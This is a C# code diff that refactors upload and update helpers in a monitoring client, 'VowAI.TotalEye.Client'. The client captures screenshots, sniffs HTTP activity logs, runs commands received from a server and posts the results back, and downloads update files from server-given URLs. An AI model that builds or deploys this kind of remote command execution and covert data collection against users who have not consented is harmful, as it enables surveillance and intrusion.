@@ -57,6 +57,25 @@ namespace VowAI.TotalEye.Client
             }
         }
 
+        private async void TryDownloadUpdate(HttpClient client)
+        {
+            HttpResponseMessage response = await client.GetAsync(_updateConfiguration.VersionUrl);
+
+            if (response.IsSuccessStatusCode == false)
+            {
+                throw new InvalidOperationException($"Fail to read update information: HTTP {response.StatusCode}.");
+            }
+
+            string text = await response.Content.ReadAsStringAsync();
+            UpdateConfiguration newConfiguration = new UpdateConfiguration().Deserialize(text);
+
+            if (newConfiguration.Version > _updateConfiguration.Version)
+            {
+                DownloadFile(client, newConfiguration.FileUrl);
+                File.WriteAllText(newConfiguration.GetLocalPath(), text);
+            }
+        }
+
         private async void Poll(HttpClient client)
         {
             CentreInfoRequest? request;
@@ -114,41 +133,17 @@ namespace VowAI.TotalEye.Client
         {
             string location = LocalComputer.RunCommand("VowAI.TotalEye.CatchScreen.exe /Destination:Screenshot.jpg");
 
-            MultipartFormDataContent content = new MultipartFormDataContent();
-            StringContent tokenContent = new StringContent(request.Token);
-            ByteArrayContent imageContent = new ByteArrayContent(File.ReadAllBytes(location));
-
-            content.Add(tokenContent, "Token");
-            content.Add(imageContent, "Payload", new FileInfo(location).Name);
-
-            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
-            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+            return await UploadFile(client, request, new FileInfo(location).Name, File.ReadAllBytes(location));
         }
 
         private async Task<ClientControlPolicy?> UploadHttpLogs(HttpClient client, CentreInfoRequest request)
         {
-            MultipartFormDataContent content = new MultipartFormDataContent();
-            StringContent tokenContent = new StringContent(request.Token, Encoding.UTF8);
-            StringContent logContent = new StringContent(_httpSniffer.ReadActivityLogs(), Encoding.UTF8, "text/plain; charset=UTF-8");
-
-            content.Add(tokenContent, "Token");
-            content.Add(logContent, "Payload");
-
-            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
-            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+            return await UploadText(client, request, _httpSniffer.ReadActivityLogs());
         }
 
         private async Task<ClientControlPolicy?> UploadCommandOutput(HttpClient client, CentreInfoRequest request)
         {
-            MultipartFormDataContent content = new MultipartFormDataContent();
-            StringContent token = new StringContent(request.Token, Encoding.UTF8);
-            StringContent outputContent = new StringContent(LocalComputer.RunCommand(request.Description), Encoding.UTF8, "text/plain; charset=UTF-8");
-
-            content.Add(token, "Token");
-            content.Add(outputContent, "Payload");
-
-            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
-            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+            return await UploadText(client, request, LocalComputer.RunCommand(request.Description));
         }
 
         private void ApplyPolicy(ClientControlPolicy policy)
@@ -169,26 +164,15 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        private async void TryDownloadUpdate(HttpClient client)
+        public void Dispose()
         {
-            HttpResponseMessage response = await client.GetAsync(_updateConfiguration.VersionUrl);
-
-            if (response.IsSuccessStatusCode == false)
-            {
-                throw new InvalidOperationException($"Fail to read update information: HTTP {response.StatusCode}.");
-            }
-
-            string text = await response.Content.ReadAsStringAsync();
-            UpdateConfiguration newConfiguration = new UpdateConfiguration().Deserialize(text);
-
-            if (newConfiguration.Version > _updateConfiguration.Version)
-            {
-                DownloadUpdate(client, newConfiguration.FileUrl);
-                File.WriteAllText(newConfiguration.GetLocalPath(), text);
-            }
+            _httpSniffer.Dispose();
+            _computerSniffer.Dispose();
         }
 
-        private async void DownloadUpdate(HttpClient client, string fileUrl)
+        #region Upload and download helper methods
+
+        private async void DownloadFile(HttpClient client, string fileUrl)
         {
             HttpResponseMessage response = await client.GetAsync(fileUrl);
 
@@ -209,10 +193,34 @@ namespace VowAI.TotalEye.Client
             }
         }
 
-        public void Dispose()
+        private async Task<ClientControlPolicy?> UploadFile(HttpClient client, CentreInfoRequest request, string name, byte[] bytes)
         {
-            _httpSniffer.Dispose();
-            _computerSniffer.Dispose();
+            MultipartFormDataContent content = new MultipartFormDataContent();
+            StringContent tokenContent = new StringContent(request.Token);
+            ByteArrayContent imageContent = new ByteArrayContent(bytes);
+
+            imageContent.Headers.Add("Content-Type", "application/octet-stream");
+
+            content.Add(tokenContent, "Token");
+            content.Add(imageContent, "Payload", name);
+
+            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
+            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
         }
+
+        private async Task<ClientControlPolicy?> UploadText(HttpClient client, CentreInfoRequest request, string text)
+        {
+            MultipartFormDataContent content = new MultipartFormDataContent();
+            StringContent token = new StringContent(request.Token, Encoding.UTF8);
+            StringContent uploadContent = new StringContent(text, Encoding.UTF8, "text/plain; charset=UTF-8");
+
+            content.Add(token, "Token");
+            content.Add(uploadContent, "Payload");
+
+            HttpResponseMessage response = await client.PostAsync(request.ReplyUrl, content);
+            return await response.Content.ReadFromJsonAsync<ClientControlPolicy>();
+        }
+
+        #endregion
     }
 }
